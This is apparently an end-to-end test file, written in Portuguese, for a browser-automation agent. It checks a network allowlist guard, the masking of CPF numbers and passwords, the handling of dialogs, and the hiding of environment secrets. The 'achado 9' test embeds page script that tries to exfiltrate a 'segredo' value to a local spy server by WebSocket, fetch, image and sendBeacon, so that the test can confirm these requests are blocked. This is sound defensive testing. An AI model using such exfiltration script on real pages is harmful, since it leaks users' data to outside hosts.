// Teste de ponta a ponta com o Chrome/Edge instalados (pulado se não houver navegador).
import './_ambiente.mjs';
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { mkdtempSync, rmSync, writeFileSync, existsSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Navegador } from '../src/navegador/navegador.mjs';
import { localizarNavegador } from '../src/navegador/localizar.mjs';
import { executarRoteiro } from '../src/navegador/roteiro.mjs';
import { carregarConfig } from '../src/core/config.mjs';

const PAGINA = `<!doctype html><html lang="pt-BR"><head><meta charset="utf-8"><title>Resgate BP</title></head><body>
<h1>Solicitar resgate</h1>
<img src="https://rastreador.exemplo.invalid/pixel.png" alt="">
<form id="f">
  <label for="cpf">CPF</label><input id="cpf" name="cpf">
  <label for="senha">Senha</label><input id="senha" type="password">
  <label for="plano">Plano</label><select id="plano"><option value="">Selecione</option><option value="pgbl">PGBL</option><option value="vgbl">VGBL</option></select>
  <label for="valor">Valor</label><input id="valor" inputmode="decimal">
  <button type="button" id="enviar">Confirmar resgate</button>
</form>
<p id="msg"></p>
<script>
  document.getElementById('enviar').addEventListener('click', () => {
    const ok = confirm('Confirmar resgate de R$ ' + document.getElementById('valor').value + '?');
    const plano = document.getElementById('plano').value;
    document.getElementById('msg').textContent = ok ? 'Resgate solicitado no plano ' + plano : 'Resgate cancelado';
    console.error('erro de teste no console');
  });
</script></body></html>`;

const exe = localizarNavegador();

test('navegador real: estado, digitação, seleção, guarda, diálogo e console', { skip: !exe && 'Chrome/Edge não encontrado', timeout: 120000 }, async () => {
  const servidor = createServer((req, res) => {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(PAGINA);
  });
  await new Promise((r) => servidor.listen(0, '127.0.0.1', r));
  const url = `http://127.0.0.1:${servidor.address().port}/`;
  const nav = new Navegador({ executavel: exe, hostsPermitidos: ['127.0.0.1'] });
  try {
    await nav.iniciar();
    assert.match(nav.produto, /Chrome|Edg/);
    await assert.rejects(nav.navegar('https://exemplo.com/'), /bloqueada pela guarda/);
    await nav.navegar(url);
    let estado = await nav.estado();
    assert.match(estado, /\[estado\] Resgate BP/);
    assert.match(estado, /## Solicitar resgate/);
    assert.match(estado, /\[guarda\] \d+ requisição\(ões\) bloqueada\(s\)/);
    assert.ok(nav.relatorioRede().bloqueios.some((b) => b.url.includes('rastreador.exemplo.invalid')), 'pixel externo bloqueado');
    await assert.rejects(nav.navegar('data:text/html,<script>fetch(1)</script>'), /bloqueada/, 'agente não navega para data:');
    const achar = (papel, nome) => [...nav.ultimosIds].find(([, i]) => i.papel === papel && i.nome === nome)?.[0];
    const cpf = achar('textbox', 'CPF');
    const senha = achar('textbox', 'Senha');
    const plano = achar('select', 'Plano');
    const valor = achar('textbox', 'Valor');
    const botao = achar('button', 'Confirmar resgate');
    assert.ok(cpf && senha && plano && valor && botao, estado);
    assert.match(await nav.digitar(cpf, '000.000.001-91'), /\[PII:cpf\]/, 'CPF mascarado na saída');
    assert.match(await nav.digitar(senha, 'senha-sintetica'), /<15 caracteres, oculto>/);
    assert.match(await nav.selecionar(plano, 'VGBL'), /"VGBL"/);
    await nav.digitar(valor, '150,00');
    estado = await nav.estado();
    assert.ok(!estado.includes('senha-sintetica'), 'senha nunca aparece no estado');
    assert.ok(!estado.includes('000.000.001-91'), 'CPF nunca aparece no estado');
    assert.match(await nav.clicar(botao), /página mudou|sem mudança/);
    await nav.esperarTexto('Resgate cancelado', 5000);
    estado = await nav.estado();
    assert.match(estado, /\[dialogo confirm rejeitado\]/, 'confirm rejeitado por padrão');
    assert.match(estado, /\[console\] 1 erro/);
    await nav.clicar(botao, { aceitarDialogo: true });
    await nav.esperarTexto('Resgate solicitado no plano vgbl', 5000);
    const pasta = mkdtempSync(join(tmpdir(), 'bp-cap-'));
    await nav.captura(join(pasta, 'tela.png'));
    assert.ok(existsSync(join(pasta, 'tela.png')));
    rmSync(pasta, { recursive: true, force: true });
  } finally {
    await nav.fechar();
    servidor.close();
  }
  assert.ok(!existsSync(nav.perfil), 'perfil temporário removido');
});

test('roteiro E2E declarativo aprova e reprova com evidência', { skip: !exe && 'Chrome/Edge não encontrado', timeout: 120000 }, async () => {
  const servidor = createServer((req, res) => {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(PAGINA.replace('<img src="https://rastreador.exemplo.invalid/pixel.png" alt="">', ''));
  });
  await new Promise((r) => servidor.listen(0, '127.0.0.1', r));
  const url = `http://127.0.0.1:${servidor.address().port}/`;
  const raiz = mkdtempSync(join(tmpdir(), 'bp-roteiro-'));
  try {
    const base = carregarConfig(raiz);
    const config = { ...base, navegador: { ...base.navegador, executavel: exe, hostsPermitidos: ['127.0.0.1'] } };
    const ok = await executarRoteiro(raiz, config, {
      nome: 'resgate-cancelado',
      url,
      passos: [
        { acao: 'selecionar', alvo: { papel: 'select', nome: 'Plano' }, opcao: 'PGBL' },
        { acao: 'digitar', alvo: { papel: 'textbox', nome: 'Valor' }, texto: '10,00' },
        { acao: 'clicar', alvo: { papel: 'button', nome: 'Confirmar resgate', exato: true } },
        { acao: 'esperarTexto', texto: 'Resgate cancelado' },
        { acao: 'verificarAusente', texto: 'Resgate solicitado' },
        { acao: 'verificarSemFalhasRede' },
      ],
    });
    assert.ok(ok.aprovado, JSON.stringify(ok.passos));
    const falha = await executarRoteiro(raiz, config, {
      nome: 'console-limpo',
      url,
      passos: [
        { acao: 'clicar', alvo: { papel: 'button', nome: 'Confirmar resgate' } },
        { acao: 'esperar', ms: 300 },
        { acao: 'verificarSemErrosConsole' },
      ],
    });
    assert.equal(falha.aprovado, false);
    assert.match(falha.passos.at(-1).erro, /erro\(s\) no console/);
    assert.ok(existsSync(join(raiz, '.bp', 'estado', 'navegador', 'capturas', 'console-limpo-falha-3.png')), 'captura da falha');
    writeFileSync(join(raiz, 'ok.txt'), 'ok');
  } finally {
    servidor.close();
    rmSync(raiz, { recursive: true, force: true });
  }
});

test('achado 9: WebSocket, fetch e imagem para host não permitido não saem do navegador', { skip: !exe && 'Chrome/Edge não encontrado', timeout: 120000 }, async () => {
  const recebidos = [];
  const espiao = createServer((req, res) => {
    recebidos.push(req.url);
    res.end('ok');
  });
  espiao.on('upgrade', (req, socket) => {
    recebidos.push(`ws:${req.url}`);
    socket.destroy();
  });
  await new Promise((r) => espiao.listen(0, '127.0.0.2', r));
  const portaEspiao = espiao.address().port;
  const pagina = `<!doctype html><title>Exfil</title><h1>Teste</h1><script>
    const alvo = '127.0.0.2:${portaEspiao}';
    try { new WebSocket('ws://' + alvo + '/websocket?d=segredo'); } catch (e) {}
    fetch('http://' + alvo + '/fetch?d=segredo').catch(() => {});
    new Image().src = 'http://' + alvo + '/img?d=segredo';
    navigator.sendBeacon && navigator.sendBeacon('http://' + alvo + '/beacon', 'segredo');
  </script>`;
  const servidor = createServer((req, res) => {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(pagina);
  });
  await new Promise((r) => servidor.listen(0, '127.0.0.1', r));
  const nav = new Navegador({ executavel: exe, hostsPermitidos: ['127.0.0.1'] });
  try {
    await nav.iniciar();
    await nav.navegar(`http://127.0.0.1:${servidor.address().port}/`);
    await new Promise((r) => setTimeout(r, 2500));
    assert.deepEqual(recebidos, [], `o servidor fora da lista recebeu: ${recebidos.join(', ')}`);
    const rede = nav.relatorioRede();
    assert.ok(rede.bloqueios.some((b) => b.url.includes('127.0.0.2')), 'tentativas da página registradas como bloqueio');
  } finally {
    await nav.fechar();
    servidor.close();
    espiao.close();
  }
});

test('achado 16: valor de ${env:BP_TESTE_*} nunca aparece na saída do roteiro', { skip: !exe && 'Chrome/Edge não encontrado', timeout: 120000 }, async () => {
  const servidor = createServer((req, res) => {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end('<!doctype html><title>Campo</title><label for="c">Código</label><input id="c" type="text"><p id="eco"></p><script>document.getElementById("c").addEventListener("input", (e) => { document.getElementById("eco").textContent = "Digitado: " + e.target.value; });</script>');
  });
  await new Promise((r) => servidor.listen(0, '127.0.0.1', r));
  const raiz = mkdtempSync(join(tmpdir(), 'bp-roteiro-env-'));
  process.env.BP_TESTE_CODIGO = 'S3nh@DeTeste-QA-2026';
  try {
    const base = carregarConfig(raiz);
    const config = { ...base, navegador: { ...base.navegador, executavel: exe, hostsPermitidos: ['127.0.0.1'] } };
    const r = await executarRoteiro(raiz, config, {
      nome: 'segredo-env',
      url: `http://127.0.0.1:${servidor.address().port}/`,
      passos: [
        { acao: 'digitar', alvo: { papel: 'textbox', nome: 'Código' }, texto: '${env:BP_TESTE_CODIGO}' },
        { acao: 'verificarTexto', texto: 'texto que não existe' },
      ],
    });
    const bruto = JSON.stringify(r) + readFileSync(join(raiz, '.bp', 'estado', 'navegador', 'roteiros', 'segredo-env.json'), 'utf8');
    assert.ok(!bruto.includes('S3nh@DeTeste-QA-2026'), 'segredo vazou na saída');
    assert.match(r.passos[0].saida, /<oculto>/);
  } finally {
    delete process.env.BP_TESTE_CODIGO;
    servidor.close();
    rmSync(raiz, { recursive: true, force: true });
  }
});
